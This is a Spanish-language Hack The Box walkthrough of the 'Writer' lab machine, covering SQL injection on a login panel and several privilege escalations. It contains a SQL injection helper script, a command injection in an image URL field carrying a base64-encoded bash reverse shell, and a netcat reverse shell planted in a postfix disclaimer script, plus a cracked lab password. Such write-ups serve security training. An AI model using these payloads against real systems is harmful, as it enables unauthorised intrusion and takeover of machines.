---
layout: single
title: Writer - Hack The Box
excerpt: "Writer es una caja ctf linux con dificultad calificada como media en la plataforma hackthebox.La maquia cubre la vilnerabilidad de inyección sql y la escalada de privilegios mediante smtp"
date: 2022-09-03
classes: wide
header:
  teaser: /assets/images/htb-writeup-writer/writer_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - cxdxnt
tags:  
  - hashcat 
  - mysql
  - db django
---

![](assets/images/htb-writeup-writer/writer_logo.png)


Maquina: Writer.
Vulnerabilidad: Sql injection union based
Escalada de privilegios: Escalando de www-data a Kyle descifrando hashes en la base de datos,Escalating from Kyle to John by poisoning postfix/disclaimer file,Escalando de John a root mediante la explotación de apt-get

## Enumeración
Para comenzar aplicamos una simple enumeracion para saber con lo que nos estamos enfrentando.
```ruby
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-03 10:38 -03
Nmap scan report for 10.10.11.101
Host is up (0.24s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| :smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-09-03T13:39:11
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.41 seconds 
``` 

## Fuzzing
Aplicamos fuzzing y encontramos lo siguiente.
![](/assets/images/htb-writeup-writer/Fuzzer.png)

Nos dirijimos hacia Administrative y nos encontramos un panel de login, probamos una inyección tipica y logramos entrar.


![](/assets/images/htb-writeup-writer/Inyeccion-panel-de-login.png)

## Inyeccion
En el panel de login probamos una inyección de tipo unión based, y inspeccionamos el código fuente antes que se haga el redirect, y vemos que al lado de admin se refleja un 2.
![](/assets/images/htb-writeup-writer/Probamos-una-inyeccion-union-based.png)

 Nos creamos un script en python3. 

```python
#!/usr/bin/python3
def injection():
    data_post = {'uname':payload,'password':"pwned"}
    r = requests.post(main_url,data=data_post,allow_redirects=False)
    regex = re.findall(r"<h3 class=\"animation-slide-top\">(.*?)</h3>",r.text)
    print(regex)
if __name__ == '__main__':
    import requests,re
    while True:
        payload = input('_>')
        main_url = "http://writer.htb/administrative"
        injection()
 ```
 Listamos las tablas una por una.
![](/assets/images/htb-writeup-writer/Enumerando-1-por-1-tablas.png)


 Extraemos un username y una password, y algunas cosas más, pero dicha información no es útil.


![](/assets/images/htb-writeup-writer/Extraemos-username-password.png)


 Por una extraña razón no podemos leer archivos mediante nuestro script, procedemos a usar burpsuite, sacamos la ruta de los archivos de la página a través del /etc/apache2/sites-enabled/000-default.conf

 Intuimos que está corriendo flask y buscamos el __init__.py , aplicamos una expresión regular para que todo quede más prolijo.


![](/assets/images/htb-writeup-writer/initt.png)

 Ahora empezamos a buscar vías de acceso para aplicar una ejecución de comandos, y encontramos lo siguiente.
![](/assets/images/htb-writeup-writer/via-para-ejecutar-comando.png)

 Entendemos como está gestionando la subida de una imagen a la web entonces procedemos a ser lo siguiente.
1. Ingresamos a la web, y subimos un archivo desde ella
2. Luego desde image_url indicamos con un wrapper a dicho archivo en este caso 
   file:///var/www/writer.htb/writer/static/img/pwned.jpg;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0MyAwPiYxCg==|base64 -d|bash;
3. Nos ponemos en escucha de dicho puerto.



![](/assets/images/htb-writeup-writer/acceso_al_sistema.png)



##  Elevacion de Privilegios

Cuando entramos en el sistema nos dirijimos a writer2_project y vemos un archivo manager.py, gracias a este archivo podemos acceder a la base de datos de forma automática.
![](/assets/images/htb-writeup-writer/accediendo-a-la-base-de-datos.png)

Obtenemos un hash y procedemos a crackearlo. Nos da una password que es la del usuario kyle.Nos logiamos como dicho usuario.
```bash
www-data@writer:/var/www/writer2_project$ su kyle 
Password: marcoantonio
kyle@writer:/var/www/writer2_project$
```
Vemos a que grupo pertenece


![](/assets/images/htb-writeup-writer/grupo-que-pertenece.png)

Al parece esta ejecutando el script /etc/postfix/disclaimer como john para recibir correos electrónicos.Podemos escribir en este script:

Vemos este script que esta relacionado a envío de correos, entonces empezamos a probar cosas.

```bash
#!/bin/sh
# Localize these.
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

# Get disclaimer addresses
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69

# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }

cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }

# obtain From address
from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi

$SENDMAIL "$@" <in.$$

exit $?
```
 Nos creamos un script en python para mandar un email.

```python
import smtplib, ssl

smtp_server = "127.0.0.1"
port = 25  # For starttls
sender_email = "kyle@writer.htb"
receiver_email = "kyle@writer.htb"
message= "pwned"
try:
    server = smtplib.SMTP(smtp_server,port)
    server.sendmail(sender_email,receiver_email,message)
except Exception as e:
    # Print any error messages to stdout
    print(e)
finally:
    server.quit() 
```

 Modificamos el script disclaimer 


```bash
#!/bin/sh
# Localize these.
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

# Get disclaimer addresses
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses


# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f

# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }

cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }

# obtain From address
```python

from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi

$SENDMAIL "$@" <in.$$

exit $?
```

Tenemos acceso como john.



![](/assets/images/htb-writeup-writer/acceso-como-john.png)


Monitorizamos procesos con el pspy y nos encontramos lo siguiente.

```bash
2022/09/05 13:52:01 CMD: UID=0    PID=56628  | /usr/sbin/CRON -f 
2022/09/05 13:52:01 CMD: UID=0    PID=56630  | /bin/sh -c /usr/bin/rm /tmp/* 
2022/09/05 13:52:01 CMD: UID=0    PID=56633  | /usr/bin/rm /tmp/snap.lxd /tmp/systemd-private-d437f1cd327f486ebd4576b578729db0-apache2.service-xz0B4g /tmp/systemd-private-d437f1cd327f486ebd4576b578729db0-systemd-logind.service-VG9Gvj /tmp/systemd-private-d437f1cd327f486ebd4576b578729db0-systemd-resolved.service-Imnx0f /tmp/systemd-private-d437f1cd327f486ebd4576b578729db0-systemd-timesyncd.service-ezY58f /tmp/systemd-private-d437f1cd327f486ebd4576b578729db0-upower.service-7syJah /tmp/vmware-root_764-2999067644 
2022/09/05 13:52:01 CMD: UID=0    PID=56632  | 
2022/09/05 13:52:01 CMD: UID=0    PID=56631  | /bin/sh -c /usr/bin/cp -r /root/.scripts/writer2_project /var/www/ 
2022/09/05 13:52:01 CMD: UID=0    PID=56635  | 
2022/09/05 13:52:01 CMD: UID=0    PID=56634  | /usr/bin/cp -r /root/.scripts/writer2_project /var/www/ 
2022/09/05 13:52:01 CMD: UID=0    PID=56637  | /usr/sbin/CRON -f 
2022/09/05 13:52:01 CMD: UID=0    PID=56636  | /usr/sbin/CRON -f 
2022/09/05 13:52:01 CMD: UID=0    PID=56639  | /bin/sh -c /usr/bin/apt-get update 
2022/09/05 13:52:01 CMD: UID=0    PID=56638  | /bin/sh -c /usr/bin/find /etc/apt/apt.conf.d/ -mtime -1 -exec rm {} \; 
2022/09/05 13:52:01 CMD: UID=0    PID=56640  | /usr/bin/apt-get update 
2022/09/05 13:52:01 CMD: UID=0    PID=56642  | /usr/lib/apt/methods/http 
2022/09/05 13:52:01 CMD: UID=33   PID=56643  | /usr/bin/python3 mana

```
El usuario root hace un apt-get update, procedimos a encontrar vías de explótacion a dicho apt-get.Según el artículo si subimos un archivo modificado a /etc/apt/apt.conf.d/ podemos ejecutar un comando.Y pum tenemoms acceso como root.


![](/assets/images/htb-writeup-writer/apt-config-d.png)
